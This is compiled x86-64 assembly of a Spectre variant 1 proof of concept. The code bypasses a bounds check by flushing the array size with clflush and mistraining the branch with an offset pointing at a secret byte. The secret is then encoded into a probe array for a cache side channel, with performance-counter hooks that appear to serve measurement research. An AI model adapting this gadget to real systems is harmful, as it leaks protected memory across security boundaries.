	.file	"spectre_stage1_2_auto.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.comm	unused1,64,32
	.globl	array1
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	g_secret_value
	.type	g_secret_value, @object
	.size	g_secret_value, 1
g_secret_value:
	.byte	89
	.globl	secret
	.section	.data.rel.local,"aw",@progbits
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	g_secret_value
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	spectre_function
	.type	spectre_function, @function
spectre_function:
.LFB3923:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	call	pmu_uops_snap_before@PLT
#APP
# 57 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_BEGIN
STAGE1_BEGIN:
# 0 "" 2
#NO_APP
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	cmpq	%rax, -8(%rbp)
	jnb	.L2
#APP
# 59 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_BEGIN
# 0 "" 2
#NO_APP
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	movzbl	(%rdx,%rax), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
#APP
# 61 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_END
# 0 "" 2
#NO_APP
.L2:
#APP
# 63 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_END
STAGE1_END:
# 0 "" 2
#NO_APP
	call	pmu_uops_snap_after@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3923:
	.size	spectre_function, .-spectre_function
	.globl	vf_set_secret
	.type	vf_set_secret, @function
vf_set_secret:
.LFB3924:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -4(%rbp)
	movzbl	-4(%rbp), %eax
	movb	%al, g_secret_value(%rip)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3924:
	.size	vf_set_secret, .-vf_set_secret
	.globl	vf_get_probe_addr_for_secret
	.type	vf_get_probe_addr_for_secret, @function
vf_get_probe_addr_for_secret:
.LFB3925:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -4(%rbp)
	movzbl	-4(%rbp), %eax
	salq	$9, %rax
	movq	%rax, %rdx
	leaq	array2(%rip), %rax
	addq	%rdx, %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3925:
	.size	vf_get_probe_addr_for_secret, .-vf_get_probe_addr_for_secret
	.globl	stage1_mistrain_trigger
	.type	stage1_mistrain_trigger, @function
stage1_mistrain_trigger:
.LFB3926:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -40(%rbp)
	movl	$29, -28(%rbp)
	jmp	.L7
.L10:
	movl	-28(%rbp), %eax
	cltd
	shrl	$28, %edx
	addl	%edx, %eax
	andl	$15, %eax
	subl	%edx, %eax
	cltq
	movq	%rax, -24(%rbp)
	leaq	array1_size(%rip), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	movl	$0, -32(%rbp)
	jmp	.L8
.L9:
	movl	-32(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -32(%rbp)
.L8:
	movl	-32(%rbp), %eax
	cmpl	$199, %eax
	jle	.L9
	movl	-28(%rbp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -16(%rbp)
	movq	-40(%rbp), %rax
	xorq	-24(%rbp), %rax
	andq	-16(%rbp), %rax
	xorq	-24(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	spectre_function
	subl	$1, -28(%rbp)
.L7:
	cmpl	$0, -28(%rbp)
	jns	.L10
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3926:
	.size	stage1_mistrain_trigger, .-stage1_mistrain_trigger
	.globl	vf_run_attack_once
	.type	vf_run_attack_once, @function
vf_run_attack_once:
.LFB3927:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	secret(%rip), %rax
	movq	%rax, %rdx
	leaq	array1(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	stage1_mistrain_trigger
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3927:
	.size	vf_run_attack_once, .-vf_run_attack_once
	.globl	vf_prepare_probe_region
	.type	vf_prepare_probe_region, @function
vf_prepare_probe_region:
.LFB3928:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$24, %rsp
	movl	%edi, -20(%rbp)
	cmpl	$0, -20(%rbp)
	jle	.L13
	cmpl	$256, -20(%rbp)
	jle	.L14
.L13:
	movl	$256, -20(%rbp)
.L14:
	movl	$0, -12(%rbp)
	jmp	.L15
.L16:
	movl	-12(%rbp), %eax
	movzbl	%al, %eax
	movl	%eax, %edi
	call	vf_get_probe_addr_for_secret
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movb	$1, (%rax)
	addl	$1, -12(%rbp)
.L15:
	movl	-12(%rbp), %eax
	cmpl	-20(%rbp), %eax
	jl	.L16
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3928:
	.size	vf_prepare_probe_region, .-vf_prepare_probe_region
	.section	.rodata
	.align 8
.LC0:
	.string	"STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n"
	.text
# [stage2 stripped] .globl	main
# [stage2 stripped] .type	main, @function
# [stage2 stripped] main:
# [stage2 stripped] .LFB3929:
# [stage2 stripped] 	.cfi_startproc
# [stage2 stripped] 	pushq	%rbp
# [stage2 stripped] 	.cfi_def_cfa_offset 16
# [stage2 stripped] 	.cfi_offset 6, -16
# [stage2 stripped] 	movq	%rsp, %rbp
# [stage2 stripped] 	.cfi_def_cfa_register 6
# [stage2 stripped] 	subq	$32, %rsp
# [stage2 stripped] 	movl	%edi, -20(%rbp)
# [stage2 stripped] 	movq	%rsi, -32(%rbp)
# [stage2 stripped] 	movq	secret(%rip), %rax
# [stage2 stripped] 	movq	%rax, %rdx
# [stage2 stripped] 	leaq	array1(%rip), %rax
# [stage2 stripped] 	subq	%rax, %rdx
# [stage2 stripped] 	movq	%rdx, %rax
# [stage2 stripped] 	movq	%rax, -8(%rbp)
# [stage2 stripped] 	movl	$0, -16(%rbp)
# [stage2 stripped] 	jmp	.L18
# [stage2 stripped] .L19:
# [stage2 stripped] 	movl	-16(%rbp), %eax
# [stage2 stripped] 	movslq	%eax, %rdx
# [stage2 stripped] 	leaq	array2(%rip), %rax
# [stage2 stripped] 	movb	$1, (%rdx,%rax)
# [stage2 stripped] 	addl	$1, -16(%rbp)
# [stage2 stripped] .L18:
# [stage2 stripped] 	cmpl	$131071, -16(%rbp)
# [stage2 stripped] 	jle	.L19
# [stage2 stripped] 	movq	-8(%rbp), %rax
# [stage2 stripped] 	movq	%rax, %rdi
# [stage2 stripped] 	call	stage1_mistrain_trigger
# [stage2 stripped] 	call	pmu_stage1_get_count@PLT
# [stage2 stripped] 	movl	%eax, -12(%rbp)
# [stage2 stripped] 	movl	$0, -16(%rbp)
# [stage2 stripped] 	jmp	.L20
# [stage2 stripped] .L21:
# [stage2 stripped] 	movl	-16(%rbp), %eax
# [stage2 stripped] 	movl	%eax, %edi
# [stage2 stripped] 	call	pmu_stage1_get_delta@PLT
# [stage2 stripped] 	movq	%rax, %rdx
# [stage2 stripped] 	movl	-16(%rbp), %eax
# [stage2 stripped] 	movl	%eax, %esi
# [stage2 stripped] 	leaq	.LC0(%rip), %rdi
# [stage2 stripped] 	movl	$0, %eax
# [stage2 stripped] 	call	printf@PLT
# [stage2 stripped] 	addl	$1, -16(%rbp)
# [stage2 stripped] .L20:
# [stage2 stripped] 	movl	-16(%rbp), %eax
# [stage2 stripped] 	cmpl	-12(%rbp), %eax
# [stage2 stripped] 	jl	.L21
# [stage2 stripped] 	call	pmu_uops_print_results@PLT
# [stage2 stripped] 	movl	$0, %eax
# [stage2 stripped] 	leave
# [stage2 stripped] 	.cfi_def_cfa 7, 8
# [stage2 stripped] 	ret
# [stage2 stripped] 	.cfi_endproc
# [stage2 stripped] .LFE3929:
# [stage2 stripped] .size	main, .-main
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
	.section	.note.GNU-stack,"",@progbits
